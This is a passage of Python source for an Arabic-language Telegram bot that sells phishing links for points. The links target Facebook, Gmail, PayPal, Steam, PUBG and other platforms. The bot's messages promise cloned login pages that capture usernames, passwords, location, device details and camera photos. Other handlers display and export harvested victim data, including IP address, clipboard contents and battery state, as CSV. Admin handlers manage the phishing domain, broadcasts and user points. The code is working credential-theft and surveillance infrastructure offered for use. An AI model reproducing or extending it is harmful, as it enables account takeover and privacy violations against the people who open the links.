        platform_name = platform_names.get(platform, platform.capitalize())
        
        keyboard = [
            [InlineKeyboardButton("✅ موافق وخصم 4 نقاط", callback_data=f"confirm_normal_{platform}")],
            [InlineKeyboardButton("❌ إلغاء", callback_data=f"phish_{platform}")]
        ]
        
        await query.edit_message_text(
            f"📦 شراء رابط {platform_name} عادي\n\n"
            f"💰 التكلفة: 4 نقاط\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n"
            f"⏰ مدة الصلاحية: 7 أيام\n\n"
            f"هل توافق على الشراء؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("confirm_normal_"):
        platform = query.data.replace("confirm_normal_", "")
        
        users[user_id]['points'] -= 4
        save_users(users)
        
        domain = get_domain()
        sessions = load_sessions()
        
        if user_id not in sessions:
            sessions[user_id] = {
                'user_id': user_id,
                'visits': 0,
                'created_at': datetime.now().isoformat()
            }
        
        if 'phish_links' not in sessions[user_id]:
            sessions[user_id]['phish_links'] = []
        
        expiry_date = datetime.now() + timedelta(days=7)
        link_id = len(sessions[user_id]['phish_links'])
        
        sessions[user_id]['phish_links'].append({
            'platform': platform,
            'type': 'normal',
            'link_id': link_id,
            'expiry': expiry_date.isoformat(),
            'created_at': datetime.now().isoformat(),
            'active': True,
            'purchased': True
        })
        
        save_sessions(sessions)
        
        # استخدام route خاص لـ PUBG
        if platform == 'pubg':
            phish_link = f"https://{domain}/pubg/{user_id}/{link_id}"
        else:
            phish_link = f"https://{domain}/phish/{platform}/{user_id}/{link_id}"
        
        platform_names = {
            'facebook': '📘 Facebook', 'instagram': '📷 Instagram', 'google': '🌐 Google',
            'gmail': '📧 Gmail', 'twitter': '🐦 Twitter', 'tiktok': '🎵 TikTok',
            'linkedin': '💼 LinkedIn', 'discord': '👾 Discord', 'snapchat': '💬 Snapchat',
            'twitch': '🎮 Twitch', 'netflix': '🎬 Netflix', 'spotify': '🎵 Spotify',
            'paypal': '💳 PayPal', 'steam': '🎮 Steam', 'whatsapp': '📱 WhatsApp',
            'github': '💻 GitHub', 'playstation': '🎮 PlayStation', 'xbox': '🎮 Xbox',
            'roblox': '🎮 Roblox', 'youtube': '📺 YouTube', 'pubg': '🎮 PUBG Mobile'
        }
        platform_name = platform_names.get(platform, platform.capitalize())
        
        keyboard = [
            [InlineKeyboardButton("🔙 رجوع للمنصات", callback_data="zphisher")],
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_menu")]
        ]
        
        await query.edit_message_text(
            f"✅ تم إنشاء رابط {platform_name} بنجاح!\n\n"
            f"🔗 الرابط:\n{phish_link}\n\n"
            f"⏰ صالح حتى: {expiry_date.strftime('%Y-%m-%d %H:%M')}\n"
            f"💎 نقاطك المتبقية: {users[user_id]['points']}\n\n"
            f"📊 عند فتح الرابط:\n"
            f"• صفحة تسجيل دخول مطابقة تماماً للأصلية\n"
            f"• جمع اسم المستخدم وكلمة المرور\n"
            f"• جمع بيانات الجهاز والموقع\n"
            f"• التقاط صورة الكاميرا\n\n"
            f"📱 البيانات ستصلك فوراً على البوت!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("buy_redirect_"):
        platform = query.data.replace("buy_redirect_", "")
        
        if user_id not in users or users[user_id]['points'] < 8:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 8 نقاط\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        platform_names = {
            'facebook': '📘 Facebook', 'instagram': '📷 Instagram', 'google': '🌐 Google',
            'gmail': '📧 Gmail', 'twitter': '🐦 Twitter', 'tiktok': '🎵 TikTok',
            'linkedin': '💼 LinkedIn', 'discord': '👾 Discord', 'snapchat': '💬 Snapchat',
            'twitch': '🎮 Twitch', 'netflix': '🎬 Netflix', 'spotify': '🎵 Spotify',
            'paypal': '💳 PayPal', 'steam': '🎮 Steam', 'whatsapp': '📱 WhatsApp',
            'github': '💻 GitHub', 'playstation': '🎮 PlayStation', 'xbox': '🎮 Xbox',
            'roblox': '🎮 Roblox', 'youtube': '📺 YouTube', 'pubg': '🎮 PUBG Mobile'
        }
        platform_name = platform_names.get(platform, platform.capitalize())
        
        context.user_data['waiting_redirect_url'] = platform
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data=f"phish_{platform}")]]
        
        await query.edit_message_text(
            f"🔄 رابط إعادة توجيه {platform_name}\n\n"
            f"💰 التكلفة: 8 نقاط\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n\n"
            f"📝 الآن، أرسل رابط المحتوى الذي تريد إعادة التوجيه إليه:\n\n"
            f"مثال:\n"
            f"• https://www.facebook.com/post/12345\n"
            f"• https://www.instagram.com/p/ABC123/\n\n"
            f"⚠️ تأكد من أن الرابط صحيح ومن نفس المنصة!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "back_to_menu":
        await start(update, context)
    
    elif query.data == "my_stats":
        await stats(update, context)
    
    elif query.data == "my_active_links":
        users = load_users()
        domain = get_domain()
        
        message = "🔗 روابطي النشطة:\n\n"
        links_count = 0
        
        free_link = f"https://{domain}/p/{user_id}"
        message += f"1️⃣ الرابط العادي المجاني:\n{free_link}\n\n"
        links_count += 1
        
        if user_id in users and 'vip_links' in users[user_id]:
            active_vip_links = []
            for vip_data in users[user_id]['vip_links']:
                if vip_data.get('is_permanent', False):
                    vip_link = f"https://{domain}/Vip/{vip_data['version']}/{user_id}"
                    active_vip_links.append({
                        'link': vip_link,
                        'version': vip_data['version'],
                        'status': 'دائم ✨',
                        'redirect': vip_data.get('redirect_link', 'لا يوجد')
                    })
                elif 'expiry' in vip_data:
                    expiry_date = datetime.fromisoformat(vip_data['expiry'])
                    if datetime.now() <= expiry_date:
                        vip_link = f"https://{domain}/Vip/{vip_data['version']}/{user_id}"
                        active_vip_links.append({
                            'link': vip_link,
                            'version': vip_data['version'],
                            'status': f"حتى: {expiry_date.strftime('%Y-%m-%d %H:%M')}",
                            'redirect': vip_data.get('redirect_link', 'لا يوجد')
                        })
            
            if active_vip_links:
                message += "👑 روابط VIP النشطة:\n\n"
                for idx, vip in enumerate(active_vip_links, 2):
                    message += f"{idx}️⃣ رابط VIP #{vip['version']}:\n"
                    message += f"{vip['link']}\n"
                    message += f"⏰ الصلاحية: {vip['status']}\n"
                    message += f"🔗 التحويل: {vip['redirect'][:40]}...\n\n"
                    links_count += 1
        
        if user_id in users and 'custom_links' in users[user_id]:
            if users[user_id]['custom_links']:
                message += "🎯 الروابط المخصصة النشطة:\n\n"
                for idx, custom in enumerate(users[user_id]['custom_links'], links_count + 1):
                    custom_link = f"https://{domain}/Custom/{custom['version']}/{user_id}"
                    features_count = sum(1 for v in custom.get('features', {}).values() if v)
                    message += f"{idx}️⃣ رابط مخصص #{custom['version']}:\n"
                    message += f"{custom_link}\n"
                    message += f"🎯 عدد الخصائص: {features_count}\n"
                    message += f"🔗 التحويل: {custom.get('redirect_link', 'لا يوجد')[:40]}...\n\n"
                    links_count += 1
        
        if links_count == 1:
            message += "📌 ملاحظة: لديك فقط الرابط العادي المجاني\n"
            message += "💡 أنشئ روابط VIP أو مخصصة للمزيد من الميزات!"
        else:
            message += f"📊 إجمالي الروابط النشطة: {links_count}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start_message")]]
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "visitors_info" or query.data.startswith("visitors_page_"):
        sessions = load_sessions()
        if user_id not in sessions:
            await query.edit_message_text("❌ لا توجد بيانات زوار بعد.\n\nأرسل /start")
            return
        
        visitors = sessions[user_id].get('visitors', [])
        if not visitors:
            await query.edit_message_text("📭 لا توجد زيارات لرابطك حتى الآن!\n\nأرسل /start للرجوع")
            return
        
        page = 0
        if query.data.startswith("visitors_page_"):
            page = int(query.data.split("_")[-1])
        
        per_page = 5
        total_pages = (len(visitors) + per_page - 1) // per_page
        start_idx = page * per_page
        end_idx = min(start_idx + per_page, len(visitors))
        
        message = f"👥 معلومات الزوار ({len(visitors)} زائر):\n"
        message += f"📄 صفحة {page + 1} من {total_pages}\n\n"
        
        for i, visitor in enumerate(visitors[start_idx:end_idx], 1):
            device = visitor.get('device', {})
            battery = device.get('battery', 'غير متاح')
            if isinstance(battery, dict):
                battery = f"{battery.get('level', 'غير متاح')} - {battery.get('charging', 'غير متاح')}"
            
            message += f"━━━━━━━━━━━━━━━━\n"
            message += f"🔢 زائر #{start_idx + i}\n"
            message += f"🕐 {visitor.get('timestamp', 'غير متاح')[:19]}\n"
            message += f"🌍 الموقع: {visitor.get('location', 'غير متاح')}\n"
            message += f"🌐 IP: {visitor.get('ip', 'غير متاح')}\n"
            message += f"🕐 المنطقة الزمنية: {visitor.get('zone', 'غير متاح')}\n"
            message += f"📋 الحافظة: {visitor.get('clipboard', 'غير متاح')[:30]}...\n"
            message += f"🖥️ الجهاز: {device.get('type', 'غير متاح')}\n"
            message += f"💻 النظام: {device.get('os', 'غير متاح')}\n"
            message += f"🌐 المتصفح: {device.get('browser', 'غير متاح')}\n"
            message += f"📏 الدقة: {device.get('screen', 'غير متاح')}\n"
            message += f"🔋 البطارية: {battery}\n"
            message += f"🌍 اللغة: {device.get('language', 'غير متاح')}\n\n"
        
        keyboard = []
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"visitors_page_{page-1}"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"visitors_page_{page+1}"))
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        keyboard.append([InlineKeyboardButton("📥 تحميل CSV", callback_data="export_visitors_csv")])
        keyboard.append([InlineKeyboardButton("🔙 الرجوع", callback_data="back_to_start_message")])
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "back_to_start_message":
        await start(update, context)
    
    elif query.data == "export_visitors_csv":
        sessions = load_sessions()
        if user_id not in sessions or not sessions[user_id].get('visitors'):
            await query.answer("❌ لا توجد بيانات للتصدير!", show_alert=True)
            return
        
        visitors = sessions[user_id].get('visitors', [])
        
        csv_content = "الرقم,الوقت,الموقع,IP,المنطقة الزمنية,الحافظة,نوع الجهاز,النظام,المتصفح,الدقة,البطارية,اللغة\n"
        
        for i, visitor in enumerate(visitors, 1):
            device = visitor.get('device', {})
            battery = device.get('battery', 'غير متاح')
            if isinstance(battery, dict):
                battery = f"{battery.get('level', 'غير متاح')} - {battery.get('charging', 'غير متاح')}"
            
            csv_content += f"{i},"
            csv_content += f"{visitor.get('timestamp', 'غير متاح')},"
            csv_content += f"{visitor.get('location', 'غير متاح')},"
            csv_content += f"{visitor.get('ip', 'غير متاح')},"
            csv_content += f"{visitor.get('zone', 'غير متاح')},"
            csv_content += f"\"{visitor.get('clipboard', 'غير متاح')}\","
            csv_content += f"{device.get('type', 'غير متاح')},"
            csv_content += f"{device.get('os', 'غير متاح')},"
            csv_content += f"{device.get('browser', 'غير متاح')},"
            csv_content += f"{device.get('screen', 'غير متاح')},"
            csv_content += f"{battery},"
            csv_content += f"{device.get('language', 'غير متاح')}\n"
        
        csv_filename = f'visitors_{user_id}.csv'
        
        with open(csv_filename, 'w', encoding='utf-8-sig') as f:
            f.write(csv_content)
        
        with open(csv_filename, 'rb') as f:
            await context.bot.send_document(
                chat_id=query.message.chat_id,
                document=f,
                filename=csv_filename,
                caption=f"📊 ملف CSV يحتوي على {len(visitors)} زائر"
            )
        
        os.remove(csv_filename)
        await query.answer("✅ تم إرسال الملف بنجاح!", show_alert=True)
    
    elif query.data == "admin_all_links" or query.data.startswith("all_links_page_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        sessions = load_sessions()
        users = load_users()
        domain = get_domain()
        
        all_links = []
        for session_user_id, session_data in sessions.items():
            user_data = users.get(session_user_id, {})
            link_info = {
                'user_id': session_user_id,
                'link': f"https://{domain}/p/{session_user_id}",
                'visits': session_data.get('visits', 0),
                'created_at': session_data.get('created_at', 'غير معروف'),
                'points': user_data.get('points', 0),
                'visitors_count': len(session_data.get('visitors', []))
            }
            all_links.append(link_info)
        
        all_links.sort(key=lambda x: x['visits'], reverse=True)
        
        page = 0
        if query.data.startswith("all_links_page_"):
            page = int(query.data.split("_")[-1])
        
        per_page = 5
        total_pages = max(1, (len(all_links) + per_page - 1) // per_page)
        start_idx = page * per_page
        end_idx = min(start_idx + per_page, len(all_links))
        
        message = f"🔗 جميع الروابط المُنشأة ({len(all_links)} رابط):\n"
        message += f"📄 صفحة {page + 1} من {total_pages}\n\n"
        
        for i, link_info in enumerate(all_links[start_idx:end_idx], 1):
            message += f"━━━━━━━━━━━━━━━━\n"
            message += f"🔢 رابط #{start_idx + i}\n"
            message += f"👤 ID: {link_info['user_id']}\n"
            message += f"🔗 {link_info['link']}\n"
            message += f"👥 الزيارات: {link_info['visits']}\n"
            message += f"👁️ عدد الزوار: {link_info['visitors_count']}\n"
            message += f"💎 النقاط: {link_info['points']}\n"
            message += f"📅 تاريخ الإنشاء: {link_info['created_at'][:10]}\n\n"
        
        keyboard = []
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"all_links_page_{page-1}"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"all_links_page_{page+1}"))
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        keyboard.append([InlineKeyboardButton("🔙 الرجوع", callback_data="back_to_start_message")])
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "admin_create_promo":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        context.user_data['waiting_for_promo_points'] = True
        await query.edit_message_text(
            "👨‍💼 إنشاء رابط ترويجي جديد\n\n"
            "🎁 أرسل عدد النقاط التي سيحصل عليها المستخدمون:\n\n"
            "مثال: 5 أو 10 أو 20"
        )
    
    elif query.data == "admin_bot_stats":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        users = load_users()
        promo_links = load_promo_links()
        sessions = load_sessions()
        
        total_users = len(users)
        total_points = sum(user.get('points', 0) for user in users.values())
        total_referrals = sum(len(user.get('referrals', [])) for user in users.values())
        total_visits = sum(session.get('visits', 0) for session in sessions.values())
        total_promo_links = len(promo_links)
        
        total_promo_usage = sum(promo.get('usage_count', 0) for promo in promo_links.values())
        
        message = "📊 إحصائيات البوت الكاملة:\n\n"
        message += f"👥 عدد المستخدمين: {total_users}\n"
        message += f"💎 إجمالي النقاط: {total_points}\n"
        message += f"🤝 إجمالي الإحالات: {total_referrals}\n"
        message += f"👁️ إجمالي الزيارات: {total_visits}\n"
        message += f"🎁 عدد الروابط الترويجية: {total_promo_links}\n"
        message += f"📈 استخدام الروابط الترويجية: {total_promo_usage}\n\n"
        
        if promo_links:
            message += "🔝 أفضل 5 روابط ترويجية:\n"
            sorted_promos = sorted(promo_links.items(), key=lambda x: x[1].get('usage_count', 0), reverse=True)[:5]
            for code, data in sorted_promos:
                message += f"   • {code}: {data.get('usage_count', 0)} استخدام ({data['points']} نقطة)\n"
        
        await query.edit_message_text(message)
    
    elif query.data == "admin_manage_channels":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        channels = load_forced_channels()
        
        message = "📢 إدارة القنوات الإجبارية\n\n"
        
        if channels:
            message += f"📊 عدد القنوات: {len(channels)}\n\n"
            for i, channel in enumerate(channels, 1):
                channel_name = channel.get('channel_name', 'غير معروف')
                channel_username = channel.get('channel_username', 'لا يوجد')
                channel_id = channel.get('channel_id', 'غير معروف')
                message += f"{i}. {channel_name}\n"
                message += f"   👤 {channel_username}\n"
                message += f"   🆔 {channel_id}\n\n"
        else:
            message += "📭 لا توجد قنوات إجبارية حالياً\n\n"
        
        keyboard = [
            [InlineKeyboardButton("➕ إضافة قناة جديدة", callback_data="admin_add_channel")],
        ]
        
        if channels:
            keyboard.append([InlineKeyboardButton("🗑️ حذف قناة", callback_data="admin_remove_channel")])
        
        keyboard.append([InlineKeyboardButton("🔙 الرجوع", callback_data="back_to_start_message")])
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == "admin_add_channel":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        context.user_data['waiting_for_channel_data'] = True
        await query.edit_message_text(
            "📢 إضافة قناة إجبارية جديدة\n\n"
            "أرسل البيانات بالصيغة التالية:\n"
            "اسم القناة | @username | -1001234567890\n\n"
            "مثال:\n"
            "قناتي الرسمية | @mychannel | -1001234567890\n\n"
            "💡 للحصول على معرف القناة:\n"
            "1. أضف @userinfobot للقناة\n"
            "2. سينشئ رسالة فيها معرف القناة"
        )
    
    elif query.data == "admin_remove_channel":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        channels = load_forced_channels()
        
        if not channels:
            await query.edit_message_text(
                "❌ لا توجد قنوات لحذفها!\n\n"
                "أرسل /start للرجوع"
            )
            return
        
        keyboard = []
        for i, channel in enumerate(channels):
            channel_name = channel.get('channel_name', 'غير معروف')
            keyboard.append([InlineKeyboardButton(
                f"🗑️ {channel_name}", 
                callback_data=f"delete_channel_{i}"
            )])
        
        keyboard.append([InlineKeyboardButton("❌ إلغاء", callback_data="admin_manage_channels")])
        
        await query.edit_message_text(
            "🗑️ اختر القناة التي تريد حذفها:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("delete_channel_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        channel_index = int(query.data.split("_")[2])
        channels = load_forced_channels()
        
        if 0 <= channel_index < len(channels):
            removed_channel = channels.pop(channel_index)
            save_forced_channels(channels)
            
            await query.edit_message_text(
                f"✅ تم حذف القناة بنجاح!\n\n"
                f"📢 القناة المحذوفة: {removed_channel.get('channel_name', 'غير معروف')}\n"
                f"👤 {removed_channel.get('channel_username', 'لا يوجد')}\n\n"
                f"📊 القنوات المتبقية: {len(channels)}\n\n"
                f"أرسل /start للرجوع"
            )
        else:
            await query.edit_message_text("❌ خطأ في الحذف!\n\nأرسل /start")
    
    elif query.data.startswith("add_forced_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        channel_id = query.data.replace("add_forced_", "")
        
        temp_key = f'temp_channel_{channel_id}'
        if temp_key not in context.bot_data:
            await query.edit_message_text("❌ انتهت صلاحية البيانات!\n\nأرسل /start")
            return
        
        channel_data = context.bot_data[temp_key]
        
        channels = load_forced_channels()
        
        for ch in channels:
            if str(ch.get('channel_id')) == str(channel_id):
                await query.edit_message_text(
                    f"⚠️ هذه القناة موجودة بالفعل في القائمة!\n\n"
                    f"📢 {channel_data['channel_name']}\n\n"
                    f"أرسل /start للرجوع"
                )
                return
        
        channels.append(channel_data)
        save_forced_channels(channels)
        
        del context.bot_data[temp_key]
        
        await query.edit_message_text(
            f"✅ تم إضافة القناة للاشتراك الإجباري!\n\n"
            f"📢 القناة: {channel_data['channel_name']}\n"
            f"👤 {channel_data['channel_username']}\n"
            f"🆔 {channel_data['channel_id']}\n\n"
            f"📊 إجمالي القنوات الإجبارية: {len(channels)}\n\n"
            f"🔔 الآن جميع المستخدمين يجب أن يشتركوا في هذه القناة لاستخدام البوت!\n\n"
            f"أرسل /start للرجوع"
        )
    
    elif query.data == "cancel_add_forced":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        await query.edit_message_text(
            "❌ تم الإلغاء.\n\n"
            "لم يتم إضافة القناة للاشتراك الإجباري.\n\n"
            "أرسل /start للرجوع"
        )
    
    elif query.data == "admin_broadcast":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        context.user_data['waiting_for_broadcast'] = True
        await query.edit_message_text(
            "📣 إذاعة رسالة للجميع\n\n"
            "📝 أرسل الرسالة التي تريد إرسالها لجميع المستخدمين:\n\n"
            "⚠️ تنبيه: سيتم إرسال الرسالة لجميع مستخدمي البوت!"
        )
    
    elif query.data == "admin_change_domain":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        current_domain = get_domain()
        keyboard = [
            [InlineKeyboardButton("✅ نعم، تغيير الدومين", callback_data="confirm_change_domain")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="back_to_start_message")]
        ]
        
        await query.edit_message_text(
            f"⚙️ تغيير الدومين\n\n"
            f"🌐 الدومين الحالي:\n{current_domain}\n\n"
            f"❓ هل تريد تغيير الدومين؟\n\n"
            f"⚠️ تنبيه: سيتم تغيير الدومين لجميع المستخدمين (الجدد والقدامى)!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "confirm_change_domain":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        current_domain = get_domain()
        context.user_data['waiting_for_old_domain'] = True
        await query.edit_message_text(
            f"⚙️ تغيير الدومين - الخطوة 1/2\n\n"
            f"🌐 الدومين الحالي:\n{current_domain}\n\n"
            f"📝 أرسل الدومين القديم الذي تريد استبداله:\n\n"
            f"مثال: https://localhost:13760/"
        )
    
    elif query.data == "admin_set_custom_domain":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        current_domain = get_domain()
        keyboard = [
            [InlineKeyboardButton("✅ نعم، تعيين دومين جديد", callback_data="confirm_set_custom_domain")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="back_to_start_message")]
        ]
        
        await query.edit_message_text(
            f"🌐 تعيين دومين مخصص (بدون Port)\n\n"
            f"🔗 الدومين الحالي:\n{current_domain}\n\n"
            f"❓ هل تريد تعيين دومين مخصص؟\n\n"
            f"⚠️ تنبيه:\n"
            f"• سيتم استخدام الدومين الجديد لجميع الروابط\n"
            f"• لا تحتاج لإضافة رقم Port (سيتم تجاهله)\n"
            f"• مثال: https://gizawi.com أو http://gizawi.com",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "confirm_set_custom_domain":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        current_domain = get_domain()
        context.user_data['waiting_for_custom_domain'] = True
        await query.edit_message_text(
            f"🌐 تعيين دومين مخصص\n\n"
            f"🔗 الدومين الحالي:\n{current_domain}\n\n"
            f"📝 أرسل الدومين المخصص الجديد:\n\n"
            f"✅ أمثلة صحيحة:\n"
            f"• https://gizawi.com\n"
            f"• http://gizawi.com\n"
            f"• https://example.com\n\n"
            f"⚠️ ملاحظات:\n"
            f"• يجب أن يبدأ بـ http:// أو https://\n"
            f"• لا تضف رقم Port (مثل :13760)\n"
            f"• لا تضف / في النهاية"
        )
    
    elif query.data == "admin_restart_bot":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        keyboard = [
            [InlineKeyboardButton("✅ نعم، إعادة التشغيل", callback_data="confirm_restart_bot")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="back_to_start_message")]
        ]
        
        await query.edit_message_text(
            "🔄 إعادة تشغيل البوت\n\n"
            "⚠️ تنبيه: سيتم إعادة تشغيل البوت بالكامل!\n\n"
            "❓ هل تريد المتابعة؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "confirm_restart_bot":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        await query.edit_message_text(
            "🔄 جاري إعادة تشغيل البوت وتنظيف البيانات...\n\n"
            "⏳ الرجاء الانتظار..."
        )
        
        import shutil
        
        # حذف مجلد vip_images بالكامل
        if os.path.exists('vip_images'):
            try:
                shutil.rmtree('vip_images')
                print("✅ تم حذف مجلد vip_images")
            except Exception as e:
                print(f"❌ خطأ في حذف vip_images: {e}")
        
        # حذف مجلد custom_link_images بالكامل
        if os.path.exists('custom_link_images'):
            try:
                shutil.rmtree('custom_link_images')
                print("✅ تم حذف مجلد custom_link_images")
            except Exception as e:
                print(f"❌ خطأ في حذف custom_link_images: {e}")
        
        # مسح ملف sessions.json (سجل الروابط)
        try:
            sessions = {}
            save_sessions(sessions)
            print("✅ تم مسح سجل الروابط")
        except Exception as e:
            print(f"❌ خطأ في مسح sessions.json: {e}")
        
        # مسح ملف users.json لتنظيف بيانات المستخدمين المتعلقة بالروابط
        try:
            users = load_users()
            for user_id_key in users.keys():
                # حذف سجلات VIP links
                if 'vip_links' in users[user_id_key]:
                    users[user_id_key]['vip_links'] = []
                # حذف سجلات Custom links
                if 'custom_links' in users[user_id_key]:
                    users[user_id_key]['custom_links'] = []
            save_users(users)
            print("✅ تم مسح سجلات روابط VIP والروابط المخصصة")
        except Exception as e:
            print(f"❌ خطأ في مسح بيانات الروابط: {e}")
        
        # إرسال إشعار للأدمن الرئيسي
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    "✅ تم تنظيف البيانات بنجاح!\n\n"
                    "🗑️ تم حذف:\n"
                    "• مجلد vip_images\n"
                    "• مجلد custom_link_images\n"
                    "• سجل الروابط (sessions.json)\n"
                    "• روابط VIP والروابط المخصصة من قاعدة البيانات\n\n"
                    "🔄 جاري إعادة تشغيل البوت..."
                )
            )
        except:
            pass
        
        import os
        os.execv(sys.executable, [sys.executable] + sys.argv)
    
    elif query.data == "admin_promote_user":
        if not is_main_admin(user_id):
            await query.answer("⛔ هذه الميزة للإدمن الرئيسي فقط!", show_alert=True)
            return
        
        context.user_data['waiting_for_promote_user_id'] = True
        await query.edit_message_text(
            "⭐ ترقية عضو إلى إدمن مساعد\n\n"
            "📝 أرسل ID المستخدم الذي تريد ترقيته:\n\n"
            "⚠️ ملاحظة: يجب أن يكون المستخدم قد تفاعل مع البوت من قبل"
        )
    
    elif query.data.startswith("confirm_promote_"):
        if not is_main_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        target_user_id = query.data.replace("confirm_promote_", "")
        assistant_admins = load_assistant_admins()
        users = load_users()
        
        if target_user_id in assistant_admins:
            await query.edit_message_text(
                "⚠️ هذا المستخدم إدمن مساعد بالفعل!\n\n"
                "أرسل /start للرجوع"
            )
            return
        
        user_info = users.get(target_user_id, {})
        assistant_admins[target_user_id] = {
            'promoted_at': datetime.now().isoformat(),
            'promoted_by': user_id,
            'user_info': user_info
        }
        save_assistant_admins(assistant_admins)
        
        await query.edit_message_text(
            f"✅ تمت ترقية المستخدم بنجاح!\n\n"
            f"👤 ID: {target_user_id}\n"
            f"⭐ الصلاحية: إدمن مساعد\n"
            f"📅 تاريخ الترقية: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🔔 المستخدم الآن لديه صلاحيات الإدمن (عدا ترقية الأعضاء)\n\n"
            "أرسل /start للرجوع"
        )
    
    elif query.data.startswith("cancel_promote_"):
        if not is_main_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        await query.edit_message_text(
            "❌ تم إلغاء عملية الترقية\n\n"
            "أرسل /start للرجوع"
        )
    
    elif query.data == "admin_manage_points":
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        context.user_data['waiting_for_points_user_id'] = True
        await query.edit_message_text(
            "💰 إدارة نقاط المستخدمين\n\n"
            "📝 أرسل ID المستخدم الذي تريد تعديل نقاطه:\n\n"
            "⚠️ ملاحظة: يجب أن يكون المستخدم موجوداً في قاعدة البيانات"
        )
    
    elif query.data.startswith("points_replace_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        target_user_id = query.data.replace("points_replace_", "")
        context.user_data['points_operation'] = 'replace'
        context.user_data['points_target_user'] = target_user_id
        context.user_data['waiting_for_points_amount'] = True
        
        users = load_users()
        current_points = users.get(target_user_id, {}).get('points', 0)
        
        await query.edit_message_text(
            f"🔄 تحويل النقاط (استبدال)\n\n"
            f"👤 ID المستخدم: {target_user_id}\n"
            f"💎 النقاط الحالية: {current_points}\n\n"
            f"📝 أرسل عدد النقاط الجديد الذي تريد تعيينه:\n\n"
            f"مثال: إذا أرسلت 50، ستصبح نقاط المستخدم = 50"
        )
    
    elif query.data.startswith("points_add_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        target_user_id = query.data.replace("points_add_", "")
        context.user_data['points_operation'] = 'add'
        context.user_data['points_target_user'] = target_user_id
        context.user_data['waiting_for_points_amount'] = True
        
        users = load_users()
        current_points = users.get(target_user_id, {}).get('points', 0)
        
        await query.edit_message_text(
            f"➕ زيادة النقاط (إضافة)\n\n"
            f"👤 ID المستخدم: {target_user_id}\n"
            f"💎 النقاط الحالية: {current_points}\n\n"
            f"📝 أرسل عدد النقاط التي تريد إضافتها:\n\n"
            f"مثال: إذا أرسلت 50، ستصبح نقاط المستخدم = {current_points} + 50 = {current_points + 50}"
        )
    
    elif query.data.startswith("cancel_points_"):
        if not is_admin(user_id):
            await query.answer("⛔ غير مصرح لك!", show_alert=True)
            return
        
        await query.edit_message_text(
            "❌ تم إلغاء عملية تعديل النقاط\n\n"
            "أرسل /start للرجوع"
        )
    
    elif query.data == "check_subscription":
        is_subscribed, not_subscribed_channels = await check_user_subscription(query.from_user.id, context)
        
        if is_subscribed:
            await query.edit_message_text(
